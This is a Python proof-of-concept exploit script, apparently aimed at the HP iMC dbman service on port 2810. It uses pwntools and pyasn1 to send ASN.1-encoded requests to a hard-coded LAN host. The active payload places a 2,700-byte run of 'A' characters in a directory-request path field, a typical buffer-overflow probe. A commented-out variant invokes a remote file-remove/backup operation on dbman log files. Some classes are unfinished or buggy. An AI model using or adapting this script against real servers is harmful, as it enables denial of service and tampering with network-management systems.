from pyasn1.type.namedtype import NamedType, NamedTypes
from pyasn1.type.univ import Sequence, OctetString, Integer, Null
from pwn import *
from pyasn1.codec.ber import encoder
import time

class AsnDbmanMkdirReq(object):
    def __init__(self, path):
        super(AsnDbmanMkdirReq, self).__init__()
        self.reservedFilePath = path

    def encode(self):
        self.s = Sequence()
        self.s.setComponentByPosition(0, OctetString(self.path))
        self.s.setComponentByPosition(1, Null())
        return encoder.encode(self.s)

class AsnPlatRemoteDiskDirReqContent(object):
    def __init__(self, flag, curDir):
        super(AsnPlatRemoteDiskDirReqContent, self).__init__()
        self.flag = flag
        self.curDir = curDir
        self.opcode = 10001

    def encode(self):
        self.s = Sequence()
        self.s.setComponentByPosition(0, Integer(self.flag))
        self.s.setComponentByPosition(1, OctetString(self.curDir))
        self.s.setComponentByPosition(2, Null())
        return encoder.encode(self.s)

class AsnRemoteReservedFileRemove(object):
    def __init__(self, reservedFilePath, backupPath, backFileExt, time):
        super(AsnRemoteReservedFileRemove, self).__init__()
        self.reservedFilePath = reservedFilePath
        self.backupPath = backupPath
        self.backFileExt = backFileExt
        self.time = time
        self.opcode = 10012

    def encode(self):
        self.s = Sequence()
        self.s.setComponentByPosition(0, OctetString(self.reservedFilePath))
        self.s.setComponentByPosition(1, OctetString(self.backupPath))
        self.s.setComponentByPosition(2, OctetString(self.backFileExt))
        self.s.setComponentByPosition(3, Integer(self.time))
        self.s.setComponentByPosition(4, Null())
        return encoder.encode(self.s)


class Dispatcher(object):
    def __init__(self, opcode, AsnType, *args, **kwargs):
        self.opcode = opcode
        self.type = AsnType

    def emit(self):
        pass


if __name__ == '__main__':
    HOST = '192.168.156.142'
    PORT = 2810 # default port
    p = make_packer(32, endian='big', sign='unsigned')
    conn = remote(HOST, PORT)

    # create the payload here
    # | opcode | alloc_size | blob |
    payload = b''
    payload += p(10001) # opcode

    #obj = AsnRemoteReservedFileRemove('C:\\Progra~1\\iMC\\dbman\\log\\dbman_debug_1.log',
    #                                  'C:\\Users\\Mohsen\dbman_debug.log',
    #                                  '.log', time.time())
    obj = AsnPlatRemoteDiskDirReqContent(1, '\x41'*2700)
    AsnEnc = obj.encode()

    payload += p(len(AsnEnc))
    payload += AsnEnc

    conn.sendline(payload)

